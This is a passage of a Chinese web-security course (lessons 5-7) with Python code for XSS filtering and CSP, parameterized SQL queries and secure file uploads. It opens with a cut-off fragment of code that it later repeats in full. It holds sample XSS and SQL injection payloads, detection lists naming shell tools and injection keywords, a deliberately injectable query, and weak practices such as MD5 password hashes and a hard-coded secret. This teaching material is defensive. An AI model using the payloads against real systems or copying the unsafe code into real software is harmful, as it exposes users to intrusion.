    MAX_FILE_SIZE = 5 * 1024 * 1024
    
    # 图片最大尺寸
    MAX_IMAGE_WIDTH = 1920
    MAX_IMAGE_HEIGHT = 1080
    
    def __init__(self, upload_dir='./secure_uploads'):
        self.upload_dir = upload_dir
        self._init_upload_dir()
    
    def _init_upload_dir(self):
        """初始化上传目录"""
        os.makedirs(self.upload_dir, exist_ok=True)
        # 创建.htaccess或nginx配置防止执行
        self._create_security_config()
    
    def _create_security_config(self):
        """创建安全配置文件"""
        # 对于Nginx，建议配置：
        # location /uploads/ {
        #     default_type text/plain;
        #     add_header Content-Disposition 'attachment; filename="$1"';
        # }
        
        # 对于Apache，创建.htaccess
        htaccess_content = """
# 禁止执行PHP、Python等脚本
AddHandler cgi-script .php .php3 .phtml .pl .py .jsp .asp .htm .shtml .sh .cgi
Options -ExecCGI
AddType text/plain .html .htm .shtml .php .phtml .php3 .py .jsp .asp

# 启用内容嗅探保护
Header set X-Content-Type-Options "nosniff"
"""
        htaccess_path = os.path.join(self.upload_dir, '.htaccess')
        if not os.path.exists(htaccess_path):
            with open(htaccess_path, 'w') as f:
                f.write(htaccess_content)
    
    def validate_extension(self, filename):
        """验证文件扩展名"""
        if '.' not in filename:
            return False
        ext = filename.rsplit('.', 1)[1].lower()
        return ext in self.ALLOWED_EXTENSIONS
    
    def validate_mime_type(self, file_content):
        """验证MIME类型（使用python-magic）"""
        mime = magic.from_buffer(file_content, mime=True)
        return mime in self.ALLOWED_MIMES
    
    def validate_image_content(self, file_content):
        """验证图片内容真实性"""
        import io
        try:
            img = Image.open(io.BytesIO(file_content))
            img.verify()  # 验证图片完整性
            
            # 额外检查：重新打开获取尺寸
            img = Image.open(io.BytesIO(file_content))
            width, height = img.size
            
            if width > self.MAX_IMAGE_WIDTH or height > self.MAX_IMAGE_HEIGHT:
                return False, f"图片尺寸超出限制 ({width}x{height})"
            
            # 检查图片格式
            img_format = img.format
            if img_format and img_format.lower() not in ['jpeg', 'png', 'gif', 'webp']:
                return False, f"不支持的图片格式: {img_format}"
            
            return True, "OK"
        except Exception as e:
            return False, f"图片验证失败: {e}"
    
    def validate_pdf_content(self, file_content):
        """验证PDF文件真实性"""
        # PDF文件头：%PDF-
        if not file_content.startswith(b'%PDF-'):
            return False, "无效的PDF文件"
        
        # 简单验证PDF结构
        if b'%%EOF' not in file_content[-20:]:
            return False, "PDF文件不完整"
        
        return True, "OK"
    
    def scan_for_malware(self, file_content, filename):
        """恶意软件扫描（模拟）"""
        # 实际可使用ClamAV等杀毒软件
        # 检查已知恶意特征
        suspicious_patterns = [
            b'<?php', b'<%', b'<script', b'<?=', b'<%@',
            b'powershell', b'cmd.exe', b'/bin/sh', b'system(',
            b'eval(', b'exec(', b'assert(', b'base64_decode'
        ]
        
        for pattern in suspicious_patterns:
            if pattern.lower() in file_content.lower():
                return False, f"检测到可疑内容: {pattern[:20].decode()}"
        
        # 检查zip炸弹
        if filename.endswith('.zip') or filename.endswith('.docx'):
            try:
                import io
                with zipfile.ZipFile(io.BytesIO(file_content)) as zf:
                    total_size = sum(zi.file_size for zi in zf.filelist)
                    if total_size > 100 * 1024 * 1024:  # 100MB限制
                        return False, "检测到Zip炸弹"
            except:
                pass
        
        return True, "OK"
    
    def generate_secure_filename(self, original_filename, file_content):
        """生成安全的文件名"""
        # 计算文件哈希
        file_hash = hashlib.sha256(file_content).hexdigest()[:16]
        
        # 获取扩展名
        ext = original_filename.rsplit('.', 1)[1].lower() if '.' in original_filename else ''
        
        # 使用UUID + 哈希 + 扩展名
        new_filename = f"{uuid.uuid4().hex}_{file_hash}"
        if
Web安全与应急响应 Python实战课程体系（续）



第二周：Web安全防御与代码审计（第5-8课）

第5课：XSS防御与CSP实战

前置知识：第4课（XSS攻击）
下一课衔接：第6课（SQL注入防御）

知识点
HTML实体编码与上下文转义
Content Security Policy（CSP）详解
HttpOnly与Secure Cookie
XSS过滤器实现
富文本XSS防护

代码练习5：XSS防御系统


"""
xss_defense_system.py
功能：完整的XSS防御系统实现
"""

import re
import html
import hashlib
import json
from flask import Flask, request, make_response, render_template_string
from urllib.parse import urlparse

class XSSDefenseSystem:
    """XSS综合防御系统"""
    
    # 白名单标签（用于富文本）
    ALLOWED_TAGS = {
        'b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li',
        'a', 'img', 'div', 'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'
    }
    
    # 白名单属性
    ALLOWED_ATTRIBUTES = {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'width', 'height'],
        'div': ['class', 'id'],
        'span': ['class', 'id']
    }
    
    # 危险协议黑名单
    DANGEROUS_PROTOCOLS = ['javascript:', 'data:', 'vbscript:', 'file:']
    
    @staticmethod
    def html_escape_context(context, context_type='html'):
        """
        根据上下文进行转义
        context_type: html, attribute, javascript, css, url
        """
        if context_type == 'html':
            return html.escape(context)
        elif context_type == 'attribute':
            # HTML属性转义
            escaped = html.escape(context)
            # 额外处理引号
            escaped = escaped.replace('"', '&quot;').replace("'", '&#39;')
            return escaped
        elif context_type == 'javascript':
            # JavaScript字符串转义
            return json.dumps(context)[1:-1]
        elif context_type == 'css':
            # CSS转义
            return re.sub(r'[\\()]', lambda m: '\\' + m.group(0), context)
        elif context_type == 'url':
            from urllib.parse import quote
            return quote(context)
        return context
    
    @staticmethod
    def sanitize_rich_text(html_content):
        """
        清洗富文本内容（白名单模式）
        """
        from bs4 import BeautifulSoup, Comment
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # 删除注释
        for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
            comment.extract()
        
        # 遍历所有标签
        for tag in soup.find_all():
            if tag.name not in XSSDefenseSystem.ALLOWED_TAGS:
                tag.unwrap()  # 保留内容但删除标签
                continue
            
            # 清理属性
            allowed_attrs = XSSDefenseSystem.ALLOWED_ATTRIBUTES.get(tag.name, [])
            attrs_to_remove = []
            for attr in tag.attrs:
                if attr not in allowed_attrs:
                    attrs_to_remove.append(attr)
                else:
                    # 检查属性值是否包含危险协议
                    attr_value = tag.attrs[attr]
                    for proto in XSSDefenseSystem.DANGEROUS_PROTOCOLS:
                        if attr_value.lower().startswith(proto):
                            attrs_to_remove.append(attr)
                            break
            
            for attr in attrs_to_remove:
                del tag.attrs[attr]
        
        return str(soup)
    
    @staticmethod
    def generate_csp_header(policy_type='strict'):
        """
        生成CSP头
        policy_type: strict, moderate, permissive
        """
        if policy_type == 'strict':
            return {
                'Content-Security-Policy': "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
            }
        elif policy_type == 'moderate':
            return {
                'Content-Security-Policy': "default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'; img-src * data:;"
            }
        else:
            return {
                'Content-Security-Policy': "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'"
            }
    
    @staticmethod
    def generate_nonce():
        """生成CSP nonce"""
        import secrets
        return secrets.token_hex(16)
    
    @staticmethod
    def set_secure_cookie(response, name, value, **kwargs):
        """设置安全的Cookie"""
        response.set_cookie(
            name, value,
            httponly=True,
            secure=True,
            samesite='Strict',
            **kwargs
        )
        return response

class XSSDefenseMiddleware:
    """Flask XSS防御中间件"""
    
    def __init__(self, app):
        self.app = app
        self.setup_csp()
    
    def setup_csp(self):
        """设置CSP中间件"""
        @self.app.after_request
        def add_csp_headers(response):
            csp_headers = XSSDefenseSystem.generate_csp_header('strict')
            for key, value in csp_headers.items():
                response.headers[key] = value
            return response
    
    def run(self, port=5000):
        self.app.run(debug=True, port=port)

class XSSFilter:
    """XSS过滤器实现"""
    
    @staticmethod
    def filter_script_tags(content):
        """过滤script标签"""
        patterns = [
            r'<script[^>]*>.*?</script>',  # 完整script标签
            r'javascript:',                   # javascript协议
            r'on\w+\s*=',                    # 事件处理器
            r'<iframe[^>]*>',                # iframe标签
            r'<object[^>]*>',                # object标签
            r'<embed[^>]*>',                 # embed标签
            r'<form[^>]*>'                   # form标签（可能用于CSRF）
        ]
        for pattern in patterns:
            content = re.sub(pattern, '', content, flags=re.IGNORECASE | re.DOTALL)
        return content
    
    @staticmethod
    def filter_encoded_payload(content):
        """过滤编码后的Payload"""
        # 解码常见编码
        import urllib.parse
        decoded = urllib.parse.unquote(content)
        
        # 检测可疑模式
        suspicious = [
            '<script', '</script>', 'javascript:', 'onerror=', 'onload=',
            'onclick=', 'onmouseover=', 'alert(', 'confirm(', 'prompt(',
            'document.cookie', 'localStorage', 'sessionStorage'
        ]
        
        for pattern in suspicious:
            if pattern.lower() in decoded.lower():
                return False
        return True

class SecureCommentSystem:
    """安全的留言板系统（综合防御）"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = hashlib.sha256(b'secure_secret_key').hexdigest()
        self.comments = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>安全留言板（XSS防御演示）</h2>
            <a href="/comment">发表留言</a> | <a href="/list">查看留言</a>
            '''
        
        @self.app.route('/comment', methods=['GET', 'POST'])
        def comment():
            if request.method == 'POST':
                name = request.form.get('name', '匿名')
                content = request.form.get('content', '')
                
                # 第1层防御：输入过滤
                if not XSSFilter.filter_encoded_payload(content):
                    return '内容包含可疑代码', 400
                
                # 第2层防御：清洗富文本
                safe_content = XSSDefenseSystem.sanitize_rich_text(content)
                safe_name = XSSDefenseSystem.html_escape_context(name, 'html')
                
                self.comments.append({
                    'name': safe_name,
                    'content': safe_content,
                    'timestamp': __import__('time').time()
                })
                return '留言成功！<a href="/list">查看留言</a>'
            
            return '''
            <h2>发表留言</h2>
            <form method="post">
                昵称: <input name="name"><br>
                内容: <textarea name="content" rows="5" cols="50"></textarea><br>
                <small>支持HTML标签: b, i, u, a, img等</small><br>
                <input type="submit" value="提交">
            </form>
            <a href="/">返回</a>
            '''
        
        @self.app.route('/list')
        def list_comments():
            html = '<h2>留言列表</h2>'
            for c in self.comments:
                html += f'''
                <div style="border:1px solid #ccc; margin:10px; padding:10px;">
                    <b>{c['name']}</b> ({__import__('datetime').datetime.fromtimestamp(c['timestamp'])}):<br>
                    <div>{c['content']}</div>
                </div>
                '''
            html += '<a href="/">返回</a>'
            
            response = make_response(html)
            # 添加CSP头
            csp_headers = XSSDefenseSystem.generate_csp_header('moderate')
            for k, v in csp_headers.items():
                response.headers[k] = v
            return response
    
    def run(self, port=5004):
        self.app.run(debug=True, port=port)

def test_xss_defense():
    """测试XSS防御效果"""
    defense = XSSDefenseSystem()
    
    print("="*50)
    print("XSS防御系统测试")
    
    # 测试1：HTML转义
    malicious = '<script>alert("XSS")</script>'
    print(f"\n测试1 - HTML转义")
    print(f"  输入: {malicious}")
    print(f"  转义后: {defense.html_escape_context(malicious, 'html')}")
    
    # 测试2：富文本清洗
    rich_content = '''
    <p>正常内容</p>
    <script>alert('evil')</script>
    <img src="x" onerror="alert(1)">
    <a href="javascript:alert('XSS')">恶意链接</a>
    <b>加粗文本</b>
    '''
    print(f"\n测试2 - 富文本清洗")
    print(f"  输入: {rich_content[:80]}...")
    sanitized = defense.sanitize_rich_text(rich_content)
    print(f"  清洗后: {sanitized[:80]}...")
    
    # 测试3：CSP头生成
    print(f"\n测试3 - CSP头")
    csp = defense.generate_csp_header('strict')
    print(f"  严格策略: {csp['Content-Security-Policy']}")
    
    # 测试4：Nonce生成
    nonce = defense.generate_nonce()
    print(f"\n测试4 - CSP Nonce")
    print(f"  生成的Nonce: {nonce}")
    
    # 测试5：XSS过滤器
    filter = XSSFilter()
    print(f"\n测试5 - XSS过滤器")
    test_payload = '<img src=x onerror=alert(1)>'
    is_safe = filter.filter_encoded_payload(test_payload)
    print(f"  Payload: {test_payload}")
    print(f"  检测结果: {'安全' if is_safe else '危险'}")

if __name__ == "__main__":
    test_xss_defense()
    
    # 启动安全留言板
    print("\n" + "="*50)
    print("启动安全留言板系统...")
    secure_board = SecureCommentSystem()
    
    import threading
    thread = threading.Thread(target=secure_board.run, args=(5004,))
    thread.daemon = True
    thread.start()
    
    print("安全留言板运行在 http://127.0.0.1:5004")
    print("演示XSS防御效果")

讲解要点：
输出转义是防御XSS的根本，必须根据上下文选择正确的转义方式
CSP作为深度防御机制，可阻止未知XSS的执行
富文本场景需使用白名单过滤而非黑名单
防御应多层：输入过滤+输出转义+CSP+HttpOnly Cookie

课后任务：实现一个支持Markdown的评论系统，确保不被XSS攻击。



第6课：SQL注入防御与参数化查询

前置知识：SQL注入基础
下一课衔接：第7课（文件上传防御）

知识点
参数化查询原理
ORM安全使用
存储过程安全
输入验证与白名单
WAF绕过与防御

代码练习6：SQL注入防御系统


"""
sql_defense_system.py
功能：SQL注入防御与参数化查询实现
"""

import re
import sqlite3
import hashlib
from contextlib import contextmanager
from flask import Flask, request, jsonify

class ParameterizedQuery:
    """参数化查询示例"""
    
    @staticmethod
    def sqlite_example():
        """SQLite参数化查询"""
        conn = sqlite3.connect(':memory:')
        cursor = conn.cursor()
        
        # 创建表
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        
        # 插入数据 - 使用参数化查询
        users = [('alice', 'pass123'), ('bob', 'pass456'), ('admin', 'admin123')]
        cursor.executemany('INSERT INTO users (username, password) VALUES (?, ?)', users)
        conn.commit()
        
        # 安全查询 - 使用参数
        def safe_query(username):
            cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
            return cursor.fetchone()
        
        # 不安全查询 - 字符串拼接
        def unsafe_query(username):
            cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
            return cursor.fetchone()
        
        return safe_query, unsafe_query
    
    @staticmethod
    def mysql_example():
        """MySQL参数化查询（使用pymysql）"""
        try:
            import pymysql
            # 参数化查询模板
            query_template = "SELECT * FROM users WHERE username = %s"
            # 正确方式：使用参数元组
            # cursor.execute(query_template, (username,))
            return True
        except ImportError:
            return False
    
    @staticmethod
    def postgresql_example():
        """PostgreSQL参数化查询（使用psycopg2）"""
        try:
            import psycopg2
            # 参数化查询模板
            query_template = "SELECT * FROM users WHERE username = %s"
            # cursor.execute(query_template, (username,))
            return True
        except ImportError:
            return False

class SQLInjectionDetector:
    """SQL注入检测器"""
    
    # SQL注入特征模式
    SQL_PATTERNS = [
        r"(\%27)|(\')|(\-\-)|(\%23)|(#)",  # 引号和注释
        r"(\%3D)|(=)|(\%3E)|(>)|(\%3C)|(<)",  # 比较运算符
        r"(\%20)|(\s)+(OR|AND)(\s)+(\d+|=)",  # OR/AND条件
        r"UNION(\s)+(ALL|SELECT|DISTINCT)",  # UNION注入
        r"SELECT(\s)+.*(\s)+FROM",  # SELECT注入
        r"INSERT(\s)+INTO",  # INSERT注入
        r"UPDATE(\s)+.*(\s)+SET",  # UPDATE注入
        r"DELETE(\s)+FROM",  # DELETE注入
        r"DROP(\s)+TABLE",  # DROP注入
        r"EXEC(\s)+.*(\s)+",  # 执行命令
        r"xp_cmdshell",  # SQL Server命令执行
        r"WAITFOR(\s)+DELAY",  # 时间盲注
        r"BENCHMARK\((\d)+,",  # MySQL基准测试
        r"DBMS_PIPE\.RECEIVE_MESSAGE",  # Oracle管道
        r"pg_sleep",  # PostgreSQL睡眠
    ]
    
    @classmethod
    def detect_injection(cls, user_input):
        """检测用户输入是否包含SQL注入特征"""
        if not user_input or not isinstance(user_input, str):
            return False
        
        for pattern in cls.SQL_PATTERNS:
            if re.search(pattern, user_input, re.IGNORECASE):
                return True
        return False
    
    @classmethod
    def sanitize_input(cls, user_input):
        """清理SQL注入特征"""
        if not user_input:
            return user_input
        
        # 转义特殊字符
        sanitized = user_input.replace("'", "''")
        sanitized = sanitized.replace("\\", "\\\\")
        
        # 移除SQL关键字（简单处理）
        sql_keywords = ['OR', 'AND', 'SELECT', 'UNION', 'INSERT', 'DELETE', 
                        'UPDATE', 'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE']
        for keyword in sql_keywords:
            sanitized = re.sub(rf'\b{keyword}\b', '', sanitized, flags=re.IGNORECASE)
        
        return sanitized

class ORMSafetyChecker:
    """ORM安全使用检查器"""
    
    @staticmethod
    def sqlalchemy_safe():
        """SQLAlchemy安全用法"""
        # 安全：使用参数绑定
        # session.query(User).filter(User.username == username)
        
        # 危险：字符串拼接
        # session.execute(f"SELECT * FROM users WHERE username = '{username}'")
        pass
    
    @staticmethod
    def django_safe():
        """Django ORM安全用法"""
        # 安全：使用参数化
        # User.objects.filter(username=username)
        
        # 危险：使用raw()拼接
        # User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
        pass
    
    @staticmethod
    def peewee_safe():
        """Peewee ORM安全用法"""
        # 安全：使用参数化
        # User.select().where(User.username == username)
        
        # 危险：使用raw()拼接
        # User.raw(f"SELECT * FROM users WHERE username = '{username}'")
        pass

class SecureDatabaseAPI:
    """安全的数据库API实现"""
    
    def __init__(self, db_path=':memory:'):
        self.conn = sqlite3.connect(db_path)
        self._init_db()
    
    def _init_db(self):
        """初始化数据库"""
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                email TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                price REAL NOT NULL,
                category TEXT
            )
        ''')
        self.conn.commit()
    
    @contextmanager
    def get_cursor(self):
        """获取数据库游标"""
        cursor = self.conn.cursor()
        try:
            yield cursor
            self.conn.commit()
        except Exception as e:
            self.conn.rollback()
            raise e
        finally:
            cursor.close()
    
    def safe_query(self, query, params=None):
        """
        安全的参数化查询
        """
        if params is None:
            params = []
        
        # 检测SQL注入
        for param in params:
            if isinstance(param, str) and SQLInjectionDetector.detect_injection(param):
                raise ValueError(f"检测到SQL注入: {param}")
        
        with self.get_cursor() as cursor:
            cursor.execute(query, params)
            return cursor.fetchall()
    
    def get_user_by_username(self, username):
        """安全地获取用户"""
        query = "SELECT * FROM users WHERE username = ?"
        return self.safe_query(query, (username,))
    
    def search_products(self, keyword, category=None):
        """安全地搜索产品"""
        query = "SELECT * FROM products WHERE name LIKE ?"
        params = [f'%{keyword}%']
        
        if category:
            query += " AND category = ?"
            params.append(category)
        
        return self.safe_query(query, params)
    
    def get_users_paginated(self, limit, offset):
        """分页查询（参数必须为整数）"""
        # 验证参数类型
        if not isinstance(limit, int) or not isinstance(offset, int):
            raise TypeError("limit和offset必须是整数")
        
        query = "SELECT * FROM users LIMIT ? OFFSET ?"
        return self.safe_query(query, (limit, offset))
    
    def get_order_by(self, column, order='ASC'):
        """
        动态排序（使用白名单）
        """
        # 白名单验证
        allowed_columns = ['id', 'username', 'created_at']
        if column not in allowed_columns:
            raise ValueError(f"不支持的排序字段: {column}")
        
        allowed_order = ['ASC', 'DESC']
        if order.upper() not in allowed_order:
            raise ValueError(f"不支持的排序方向: {order}")
        
        # 安全地拼接（已验证的列名）
        query = f"SELECT * FROM users ORDER BY {column} {order}"
        return self.safe_query(query)

class SQLVulnerableApp:
    """存在SQL注入漏洞的应用（用于演示）"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.db = SecureDatabaseAPI()
        self._init_test_data()
        self.setup_routes()
    
    def _init_test_data(self):
        """初始化测试数据"""
        # 添加测试用户
        test_users = [
            ('admin', hashlib.md5('admin123'.encode()).hexdigest(), 'admin@example.com'),
            ('alice', hashlib.md5('alice123'.encode()).hexdigest(), 'alice@example.com'),
            ('bob', hashlib.md5('bob123'.encode()).hexdigest(), 'bob@example.com')
        ]
        
        for username, password, email in test_users:
            try:
                self.db.safe_query(
                    "INSERT INTO users (username, password, email) VALUES (?, ?, ?)",
                    (username, password, email)
                )
            except:
                pass
    
    def setup_routes(self):
        @self.app.route('/search')
        def search():
            """安全搜索"""
            keyword = request.args.get('q', '')
            try:
                results = self.db.search_products(keyword)
                return jsonify({'results': results})
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/user/<username>')
        def get_user(username):
            """安全获取用户"""
            try:
                results = self.db.get_user_by_username(username)
                if results:
                    return jsonify({'user': results[0]})
                return jsonify({'error': '用户不存在'}), 404
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/users')
        def list_users():
            """分页列表（安全）"""
            try:
                page = int(request.args.get('page', 1))
                per_page = int(request.args.get('per_page', 10))
                offset = (page - 1) * per_page
                
                results = self.db.get_users_paginated(per_page, offset)
                return jsonify({'users': results, 'page': page})
            except (TypeError, ValueError) as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/sort')
        def sort_users():
            """排序（白名单验证）"""
            column = request.args.get('by', 'id')
            order = request.args.get('order', 'ASC')
            
            try:
                results = self.db.get_order_by(column, order)
                return jsonify({'users': results})
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
    
    def run(self, port=5005):
        self.app.run(debug=True, port=port)

class SQLInjectionDefenseCheatsheet:
    """SQL注入防御速查表"""
    
    @staticmethod
    def best_practices():
        """最佳实践"""
        practices = {
            "DO_use_parameterized_queries": """
                # 正确：使用参数化查询
                cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
            """,
            "DONOT_string_concat": """
                # 错误：字符串拼接
                cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
            """,
            "DO_validate_input_type": """
                # 正确：验证输入类型
                if not isinstance(user_id, int):
                    raise TypeError("ID必须是整数")
            """,
            "DO_use_whitelist_for_dynamic": """
                # 正确：动态表名/列名使用白名单
                allowed_columns = ['id', 'name', 'email']
                if column not in allowed_columns:
                    raise ValueError("无效的列名")
            """,
            "DO_limit_database_privileges": """
                # 正确：使用最小权限原则
                # 应用数据库账户只有SELECT/INSERT/UPDATE权限
            """,
            "DO_use_ORM_safely": """
                # 正确：使用ORM的参数化接口
                User.objects.filter(username=username)
            """
        }
        return practices

def test_sql_injection_detection():
    """测试SQL注入检测"""
    detector = SQLInjectionDetector()
    
    print("="*50)
    print("SQL注入检测测试")
    
    test_cases = [
        ("正常输入", "hello world", False),
        ("引号注入", "admin' OR '1'='1", True),
        ("注释注入", "admin' --", True),
        ("UNION注入", "1 UNION SELECT * FROM users", True),
        ("布尔注入", "1 AND 1=1", True),
        ("时间盲注", "1 AND SLEEP(5)", True),
        ("堆叠查询", "1; DROP TABLE users", True),
        ("编码注入", "%27%20OR%20%271%27=%271", True),
    ]
    
    for name, input_str, expected in test_cases:
        result = detector.detect_injection(input_str)
        status = "✓" if result == expected else "✗"
        print(f"{status} {name}: {result} (预期: {expected})")
        if result:
            print(f"    输入: {input_str[:50]}")

def demo_parameterized_queries():
    """演示参数化查询"""
    print("\n" + "="*50)
    print("参数化查询演示")
    
    # 获取参数化查询示例
    safe_query, unsafe_query = ParameterizedQuery.sqlite_example()
    
    # 正常查询
    print("\n正常查询:")
    print(f"  安全查询: {safe_query('alice')}")
    print(f"  不安全查询: {unsafe_query('alice')}")
    
    # SQL注入攻击演示
    malicious = "admin' OR '1'='1"
    print(f"\n恶意输入: {malicious}")
    
    try:
        result = safe_query(malicious)
        print(f"  安全查询结果: {result} (未注入)")
    except Exception as e:
        print(f"  安全查询错误: {e}")
    
    try:
        result = unsafe_query(malicious)
        print(f"  不安全查询结果: {result} (注入成功)")
    except Exception as e:
        print(f"  不安全查询错误: {e}")

if __name__ == "__main__":
    # 测试SQL注入检测
    test_sql_injection_detection()
    
    # 演示参数化查询
    demo_parameterized_queries()
    
    # 启动安全API
    print("\n" + "="*50)
    print("启动安全数据库API...")
    api_app = SQLVulnerableApp()
    
    import threading
    thread = threading.Thread(target=api_app.run, args=(5005,))
    thread.daemon = True
    thread.start()
    
    print("API运行在 http://127.0.0.1:5005")
    print("\nSQL注入防御最佳实践:")
    for name, practice in SQLInjectionDefenseCheatsheet.best_practices().items():
        print(f"\n{name}:")
        print(practice.strip())

讲解要点：
参数化查询是防御SQL注入最有效的方法
ORM不能自动防御SQL注入，需正确使用参数绑定
动态表名/列名必须使用白名单验证
输入验证与参数化查询结合使用效果更好

课后任务：将现有使用字符串拼接的数据库操作改写为参数化查询。



第7课：文件上传漏洞深度防御

前置知识：第4周内容（文件上传）
下一课衔接：第8课（代码审计实战）

知识点
文件类型多重验证
内容安全检测（魔数、图片检测）
文件名随机化与路径安全
上传目录权限控制
云存储安全上传

代码练习7：安全文件上传系统


"""
secure_file_upload.py
功能：安全的文件上传系统实现
"""

import os
import re
import uuid
import magic
import hashlib
import imghdr
import zipfile
from PIL import Image
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from werkzeug.utils import secure_filename

class SecureFileUpload:
    """安全文件上传处理器"""
    
    # 允许的文件类型（白名单）
    ALLOWED_MIMES = {
        'image/jpeg': 'jpg',
        'image/png': 'png',
        'image/gif': 'gif',
        'image/webp': 'webp',
        'application/pdf': 'pdf',
        'text/plain': 'txt',
        'application/msword': 'doc',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 'docx'
    }
    
    # 允许的文件扩展名
    ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf', 'txt', 'doc', 'docx'}
    
    # 最大文件大小（5MB）
    MAX_FILE_SIZE = 5 * 1024 * 1024
    
    # 图片最大尺寸
    MAX_IMAGE_WIDTH = 1920
    MAX_IMAGE_HEIGHT = 1080
    
    def __init__(self, upload_dir='./secure_uploads'):
        self.upload_dir = upload_dir
        self._init_upload_dir()
    
    def _init_upload_dir(self):
        """初始化上传目录"""
        os.makedirs(self.upload_dir, exist_ok=True)
        # 创建.htaccess或nginx配置防止执行
        self._create_security_config()
    
    def _create_security_config(self):
        """创建安全配置文件"""
        # 对于Nginx，建议配置：
        # location /uploads/ {
        #     default_type text/plain;
        #     add_header Content-Disposition 'attachment; filename="$1"';
        # }
        
        # 对于Apache，创建.htaccess
        htaccess_content = """
# 禁止执行PHP、Python等脚本
AddHandler cgi-script .php .php3 .phtml .pl .py .jsp .asp .htm .shtml .sh .cgi
Options -ExecCGI
AddType text/plain .html .htm .shtml .php .phtml .php3 .py .jsp .asp

# 启用内容嗅探保护
Header set X-Content-Type-Options "nosniff"
"""
        htaccess_path = os.path.join(self.upload_dir, '.htaccess')
        if not os.path.exists(htaccess_path):
            with open(htaccess_path, 'w') as f:
                f.write(htaccess_content)
    
    def validate_extension(self, filename):
        """验证文件扩展名"""
        if '.' not in filename:
            return False
        ext = filename.rsplit('.', 1)[1].lower()
        return ext in self.ALLOWED_EXTENSIONS
    
    def validate_mime_type(self, file_content):
        """验证MIME类型（使用python-magic）"""
        mime = magic.from_buffer(file_content, mime=True)
        return mime in self.ALLOWED_MIMES
    
    def validate_image_content(self, file_content):
        """验证图片内容真实性"""
        import io
        try:
            img = Image.open(io.BytesIO(file_content))
            img.verify()  # 验证图片完整性
            
            # 额外检查：重新打开获取尺寸
            img = Image.open(io.BytesIO(file_content))
            width, height = img.size
            
            if width > self.MAX_IMAGE_WIDTH or height > self.MAX_IMAGE_HEIGHT:
                return False, f"图片尺寸超出限制 ({width}x{height})"
            
            # 检查图片格式
            img_format = img.format
            if img_format and img_format.lower() not in ['jpeg', 'png', 'gif', 'webp']:
                return False, f"不支持的图片格式: {img_format}"
            
            return True, "OK"
        except Exception as e:
            return False, f"图片验证失败: {e}"
    
    def validate_pdf_content(self, file_content):
        """验证PDF文件真实性"""
        # PDF文件头：%PDF-
        if not file_content.startswith(b'%PDF-'):
            return False, "无效的PDF文件"
        
        # 简单验证PDF结构
        if b'%%EOF' not in file_content[-20:]:
            return False, "PDF文件不完整"
        
        return True, "OK"
    
    def scan_for_malware(self, file_content, filename):
        """恶意软件扫描（模拟）"""
        # 实际可使用ClamAV等杀毒软件
        # 检查已知恶意特征
        suspicious_patterns = [
            b'<?php', b'<%', b'<script', b'<?=', b'<%@',
            b'powershell', b'cmd.exe', b'/bin/sh', b'system(',
            b'eval(', b'exec(', b'assert(', b'base64_decode'
        ]
        
        for pattern in suspicious_patterns:
            if pattern.lower() in file_content.lower():
                return False, f"检测到可疑内容: {pattern[:20].decode()}"
        
        # 检查zip炸弹
        if filename.endswith('.zip') or filename.endswith('.docx'):
            try:
                import io
                with zipfile.ZipFile(io.BytesIO(file_content)) as zf:
                    total_size = sum(zi.file_size for zi in zf.filelist)
                    if total_size > 100 * 1024 * 1024:  # 100MB限制
                        return False, "检测到Zip炸弹"
            except:
                pass
        
        return True, "OK"
    
    def generate_secure_filename(self, original_filename, file_content):
        """生成安全的文件名"""
        # 计算文件哈希
        file_hash = hashlib.sha256(file_content).hexdigest()[:16]
        
        # 获取扩展名
        ext = original_filename.rsplit('.', 1)[1].lower() if '.' in original_filename else ''
        
        # 使用UUID + 哈希 + 扩展名
        new_filename = f"{uuid.uuid4().hex}_{file_hash}"
        if ext:
            new_filename += f".{ext}"
        
        return new_filename
    
    def process_upload(self, file, metadata=None):
        """
        处理文件上传
        返回: (success, filepath_or_error, details)
        """
        if not file:
            return False, "没有上传文件", None
        
        # 1. 验证文件大小
        file.seek(0, os.SEEK_END)
        size = file.tell()
        file.seek(0)
        
        if size > self.MAX_FILE_SIZE:
            return False, f"文件过大，最大 {self.MAX_FILE_SIZE // 1024 // 1024}MB", None
        
        # 2. 验证文件名
        original_filename = secure_filename(file.filename)
        if not original_filename:
            return False, "无效的文件名", None
        
        # 3. 验证扩展名
        if not self.validate_extension(original_filename):
            return False, f"不允许的文件类型，允许: {', '.join(self.ALLOWED_EXTENSIONS)}", None
        
        # 4. 读取文件内容
        file_content = file.read()
        
        # 5. 验证MIME类型
